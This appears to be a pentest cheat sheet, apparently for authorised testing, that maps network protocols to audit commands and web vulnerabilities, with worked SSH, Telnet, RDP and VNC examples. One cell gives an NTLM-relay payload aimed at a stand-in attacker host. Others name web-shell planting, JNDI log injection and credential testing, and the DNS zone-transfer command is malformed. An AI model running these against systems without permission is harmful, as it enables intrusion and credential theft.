---

## Security Auditing & Web Vulnerabilities (Sections 1–8)

### Environment Setup: Ubuntu vs. Termux
* **Ubuntu:** Full root access (`sudo`) allows raw socket scanning (`nmap -sS`), packet sniffing (`tcpdump`, Wireshark), and native execution of heavy frameworks.
* **Termux:** Runs in an unprivileged Android user space. Raw socket scans fail without root—always use TCP connect scans (`nmap -sT -Pn`) and Python/Go-based CLI tools (`pip`, `pkg`).

---

### 1. Web & Data Browsing Auditing

| Protocol | Auditing Focus (Ubuntu & Termux) | Associated Web Bugs |
| :--- | :--- | :--- |
| **HTTP / HTTPS** | Inspecting TLS configurations (`testssl.sh`, `sslyze`), HTTP headers (`curl -I`), and directory/endpoint fuzzing (`ffuf`, `gobuster`). | XSS, SQLi, IDOR, SSRF, CORS misconfigurations, exposed `.git`/`.env` files, and weak TLS ciphers. |
| **WebSocket** | Intercepting and replaying real-time frames using proxies (Burp Suite / OWASP ZAP on Ubuntu) or `websocat` (Ubuntu & Termux). | Cross-Site WebSocket Hijacking (CSWSH), missing message-level authorization, and injection flaws inside JSON/XML frames. |
| **REST / GraphQL** | Enumerating hidden endpoints, testing HTTP methods (`OPTIONS`, `PUT`, `DELETE`), and querying GraphQL introspection schemas (`curl`, `clairvoyance`). | Broken Object Level Authorization (BOLA/IDOR), GraphQL introspection enabled in production, batching/aliasing DoS, and mass assignment. |

---

### 2. File Transfer & Sharing Auditing

| Protocol | Auditing Focus (Ubuntu & Termux) | Associated Web Bugs |
| :--- | :--- | :--- |
| **FTP / FTPS** | Checking anonymous login (`nmap --script ftp-anon`), banner versions, and directory write permissions using `ftp` or `curl`. | Writable web root directories allowing arbitrary web shell uploads, and cleartext credential interception. |
| **SFTP** | Auditing supported SSH ciphers and testing user directory chroot restrictions via `sftp`. | Path traversal out of restricted home directories into sensitive web application configuration folders. |
| **TFTP** | Probing UDP port 69 (`nmap -sU -p 69` on Ubuntu) or `tftp` client to pull known default configuration filenames. | Unauthenticated retrieval of network device configs containing hardcoded web admin passwords or API keys. |
| **SMB / CIFS** | Enumerating shares and null sessions using `smbclient -L` or `enum4linux-ng` (Python-based, works on both Ubuntu and Termux). | Exposed web root shares (`wwwroot`), sensitive backup leaks, and **NTLM Relay** attacks triggered via web XSS/SSRF (`<img src="\\attacker-ip\share">`). |
| **NFS** | Listing exported shares with `showmount -e <target>` and inspecting read/write permissions (`no_root_squash`). | Mounting exposed web server directories locally to read source code, database credentials, or plant web shells. |

---

### 3. Email & Messaging Auditing

| Protocol | Auditing Focus (Ubuntu & Termux) | Associated Web Bugs |
| :--- | :--- | :--- |
| **SMTP** | Testing open relays, user enumeration (`VRFY`/`EXPN`), and SPF/DKIM/DMARC records using `swaks`, `dig`, or `nmap --script smtp-enum-users`. | **SMTP Header Injection** in web contact forms, email spoofing due to missing DMARC/SPF, and SSRF interactions via `gopher://`. |
| **IMAP / POP3** | Checking cleartext authentication support and SSL/TLS certificates via `openssl s_client` or `nmap`. | Credential leaks in webmail source code, and **CRLF/IMAP Injection** when webmail apps pass unsanitized input to backend mail servers. |
| **XMPP / IRC** | Inspecting unencrypted server-to-server ports, open registration, and channel access controls via `nmap` or `nc`. | Information disclosure in public developer/ops channels (leaked tokens, internal URLs) and SSRF pivoting into internal chat bots. |

---

### 4. Remote Access & Terminal Control Auditing

| Protocol | Auditing Focus (Ubuntu & Termux) | Associated Web Bugs |
| :--- | :--- | :--- |
| **SSH** | Checking weak algorithms and outdated versions with `ssh-audit` (Python) and setting up SOCKS tunnels (`ssh -D`) for internal web testing. | Leaked private keys (`/.ssh/id_rsa`) in public web roots or Git repositories, and internal banner discovery via SSRF. |
| **Telnet** | Grabbing banners and testing unauthenticated access with `nc <target> 23` or `telnet`. | Hardcoded credentials in IoT/router web panels and **OS Command Injection** in web interfaces that wrap Telnet commands. |
| **RDP** | Auditing Network Level Authentication (NLA) and extracting internal domain names via `nmap --script rdp-ntlm-info -p 3389`. | Internal Active Directory domain disclosure and exposed **RD Web Access** (`/RDWeb/`) portals vulnerable to user enumeration. |
| **VNC** | Checking for unauthenticated access (`Security Type: None`) via `nmap --script vnc-info -p 5900`. | Exposed **noVNC** web sockets (ports `6080`/`8080`) granting unauthenticated graphical access directly inside a browser. |

---

### 5. Network Naming, Addressing & Configuration Auditing

| Protocol | Auditing Focus (Ubuntu & Termux) | Associated Web Bugs |
| :--- | :--- | :--- |
| **DNS** | Testing zone transfers (`dig axfr @://target.com`), subdomain enumeration (`subfinder`, `amass`), and DNSSEC validation. | **Subdomain Takeover** (dangling CNAME records pointing to unclaimed cloud/SaaS services) and DNS rebinding to bypass SSRF filters. |
| **DHCP** | Auditing rogue DHCP server protections and lease starvation resilience on local networks (requires root on Ubuntu). | Malicious WPAD (Web Proxy Auto-Discovery) injection via DHCP, forcing browsers to route web traffic through an attacker proxy. |
| **NTP** | Querying server variables and peer lists (`ntpq -p`, `nmap --script ntp-info -p 123`) to check for amplification or info leaks. | Internal hostname/OS disclosure and token/session expiration bypasses if web servers rely on unsynchronized clocks. |
| **LDAP** | Checking anonymous binds and querying directory schemas using `ldapsearch` (available on Ubuntu and Termux). | **LDAP Injection** in web login forms or search filters, and cleartext credential interception over port 389. |
| **Kerberos** | Auditing AS-REP Roasting / Kerberoasting exposure and enumerating valid usernames via `kerbrute` (Go binary, runs on Ubuntu & Termux). | Windows Integrated Authentication (SPNEGO) misconfigurations in enterprise web apps and internal user enumeration. |
| **RADIUS** | Checking shared secret strength and deprecated authentication methods (PAP/CHAP) in network access configurations. | Authentication bypasses or credential leaks when web-based captive portals interface insecurely with backend RADIUS servers. |

---

### 6. Network Management & Monitoring Auditing

| Protocol | Auditing Focus (Ubuntu & Termux) | Associated Web Bugs |
| :--- | :--- | :--- |
| **SNMP** | Testing default community strings (`public`, `private`) and walking OID trees with `snmpwalk` or `onesixtyone`. | Extracting full running configs, internal IP tables, and plaintext web admin passwords from routers/servers via SNMPv1/v2c. |
| **Syslog** | Verifying whether UDP/TCP port 514 accepts unauthenticated external log injection (`nc -u <target> 514`). | **Log Forging / Log Injection**—injecting malicious payloads (such as XSS or JNDI strings) into logs viewed via a web-based SIEM dashboard. |
| **NETCONF** | Inspecting SSH subsystem exposure on port 830 and testing XML-RPC input validation. | **XXE (XML External Entity)** vulnerabilities when web management portals translate user input into backend NETCONF XML payloads. |

---

### 7. Voice, Video & Real-Time Media Auditing

| Protocol | Auditing Focus (Ubuntu & Termux) | Associated Web Bugs |
| :--- | :--- | :--- |
| **SIP** | Enumerating extensions and testing registration requirements using `svmap` / `svwar` (SIPVicious, Python-based). | Toll fraud, extension enumeration, and **SIP Header Injection** via web-based "Click-to-Call" or VoIP management portals. |
| **RTP / RTSP** | Checking unauthenticated camera/media streams on port 554 using `nmap --script rtsp-url-brute` or `ffplay`/`mpv`. | Unauthenticated live video feeds exposed via IP camera web interfaces and path traversal in RTSP URL handlers. |
| **WebRTC** | Inspecting STUN/TURN server configurations and SDP (Session Description Protocol) payloads in browser dev tools. | **Internal IP Address Disclosure** via STUN leaks and SSRF/port scanning abuses via misconfigured TURN relay servers. |

---

### 8. IoT & Industrial Protocols Auditing

| Protocol | Auditing Focus (Ubuntu & Termux) | Associated Web Bugs |
| :--- | :--- | :--- |
| **MQTT** | Subscribing to wildcard topics (`mosquitto_sub -h <target> -t '#' -v`) on port 1883 to check for unauthenticated broker access. | Reading sensitive telemetry/session tokens published by IoT web dashboards, or injecting malicious commands into subscribed devices. |
| **CoAP** | Querying `.well-known/core` resources on UDP port 5683 using `coap-client` or Python `aiocoap`. | Unauthenticated device control and **HTTP-to-CoAP Proxy SSRF** when web gateways translate REST calls into CoAP requests. |
| **AMQP** | Checking default guest credentials (`guest:guest` on port 5672) and inspecting management plugins (port 15672). | Exposed **RabbitMQ Management Web UIs** (`15672`), allowing attackers to read queued web tasks, inject jobs, or steal API keys. |
### 2. Security Auditing & Web Vulnerabilities (Section 4: Remote Access)

In authorized penetration testing and bug bounty hunting, remote access protocols often overlap with web applications through exposed management panels, SSRF (Server-Side Request Forgery), or leaked configuration files.

#### Environment Differences: Ubuntu vs. Termux

* **Ubuntu:** Provides a full Linux kernel and root access (`sudo`). You can run raw socket scans (like `nmap -sS`), use GUI clients for RDP/VNC, and install full security suites natively.
* **Termux:** Runs in an unprivileged Android user space without root by default. Raw socket scans are restricted (you must use TCP connect scans like `nmap -sT`), and GUI protocols (RDP/VNC) require routing output to an external Android VNC/RDP viewer app or headless inspection tools.

#### Protocol-by-Protocol Breakdown

##### 1. SSH (Port 22)

* **How it is audited (Ubuntu & Termux):**
  * **Banner Grabbing & Enumeration:** Using `nmap -sV -p 22 <target>` or `ssh-audit` (available via Python `pip` on both Ubuntu and Termux) to check supported encryption algorithms, MACs, and outdated OpenSSH versions.
  * **Port Forwarding / Tunneling:** During authorized post-exploitation or internal assessments, `ssh -L` or `ssh -D` (SOCKS proxy) is used to route web traffic from your local browser into internal web dashboards that are not exposed to the internet.
  * **Additional Auditing Commands:**
    ```bash
    # Grab raw SSH banner using Netcat
    nc -nv <target> 22

    # Enumerate supported SSH authentication methods and host keys
    nmap -p 22 --script ssh-auth-methods,ssh-hostkey <target>

    # Run full cryptographic audit
    ssh-audit <target>

    # Create a local SOCKS5 proxy on port 9050 to route browser traffic internally
    ssh -D 9050 -N user@<target>

    # Forward an internal web port (8080) to your local machine (8081)
    ssh -L 8081:127.0.0.1:8080 user@<target>
    ```
* **Web Bugs Found:**
  * **Exposed Private Keys in Web Roots:** Web servers or public Git repositories (`.git/config`, `/.ssh/id_rsa`, `deployment.sh`) accidentally leaking SSH private keys, granting direct server access.
  * **SSRF to Internal SSH:** Identifying outdated SSH banners internally via SSRF bugs (`gopher://` or `dict://` wrappers in older libraries).

##### 2. Telnet (Port 23)

* **How it is audited (Ubuntu & Termux):**
  * **Banner & Service Inspection:** Using `telnet <target> 23` or `nc <target> 23` (available via `netcat-openbsd` in both environments) to inspect login prompts, device firmware versions, and unauthenticated administrative menus.
  * **Traffic Analysis:** On Ubuntu (with `tcpdump` or Wireshark), auditors verify whether legacy systems transmit credentials in cleartext over local segments.
  * **Additional Auditing Commands:**
    ```bash
    # Enumerate Telnet encryption options and banners via Nmap
    nmap -sV -p 23 --script telnet-encryption,telnet-ntlm-info <target>

    # Connect interactively to inspect prompts
    nc -nv <target> 23

    # Capture cleartext Telnet traffic on Ubuntu (requires root)
    sudo tcpdump -i eth0 port 23 -A
    ```
* **Web Bugs Found:**
  * **Hardcoded IoT/Router Credentials:** Web-based router/camera admin panels often expose Telnet on the WAN interface with default credentials documented in public firmware or leaked in web UI JavaScript files.
  * **Command Injection in Web UIs:** Web interfaces for network appliances frequently pass user input directly into backend Telnet or shell commands.

##### 3. RDP (Port 3389)

* **How it is audited (Ubuntu & Termux):**
  * **Encryption & NLA Checks:** Using `nmap --script rdp-enum-encryption,rdp-ntlm-info -p 3389 <target>` to verify if Network Level Authentication (NLA) is enforced and to extract internal Windows domain names and OS build numbers.
  * **Client Connection:** On Ubuntu, `xfreerdp` connects directly to test access. On Termux, `xfreerdp` can be compiled or paired with Termux:X11, though auditors typically rely on `nmap` NSE scripts for enumeration.
  * **Additional Auditing Commands:**
    ```bash
    # Audit RDP encryption, NLA status, and NTLM domain disclosure
    nmap -sT -p 3389 --script rdp-enum-encryption,rdp-ntlm-info <target>

    # Check if NLA is disabled using xfreerdp (Ubuntu)
    xfreerdp /v:<target> /sec:rdp /cert:ignore +auth-only

    # Test valid credentials without spawning a full desktop session
    xfreerdp /v:<target> /u:<username> /p:<password> /cert:ignore +auth-only
    ```
* **Web Bugs Found:**
  * **Information Disclosure via NTLM:** Even without logging in, querying RDP (or web-based RD Web Access portals) reveals internal Active Directory domain names and server hostnames useful for targeted phishing or web auth bypasses.
  * **Exposed RD Web Access / Gateways:** Misconfigured IIS web portals (`/RDWeb/`) vulnerable to username enumeration, weak password policies, or known gateway CVEs.

##### 4. VNC (Port 5900+)

* **How it is audited (Ubuntu & Termux):**
  * **Authentication & Security Type Checks:** Using `nmap --script vnc-info,realvnc-auth-bypass -p 5900 <target>` to check if authentication is disabled ("None") or if legacy authentication bypass flaws exist.
  * **Screen Capture / Viewing:** On Ubuntu, tools like `vncviewer` or `EyeWitness` capture screenshots of exposed VNC desktops. On Termux, auditors use Python scripts or `nmap` scripts to verify open sessions.
  * **Additional Auditing Commands:**
    ```bash
    # Scan common VNC ports (5900-5905) and check security types
    nmap -sT -p 5900-5905 --script vnc-info,vnc-title <target>

    # Check RFB protocol handshake version manually via Netcat
    nc -nv <target> 5900

    # Probe common noVNC web endpoints via curl
    curl -I -k http://<target>:6080/vnc.html
    ```
* **Web Bugs Found:**
  * **Exposed noVNC WebSockets:** Many cloud environments, Docker containers, and virtual lab platforms expose VNC over HTTP/WebSockets (commonly ports `6080` or `8080` via **noVNC**). Finding an unauthenticated noVNC web endpoint in a bug bounty scope often leads directly to full graphical Remote Code Execution (RCE) in the browser.
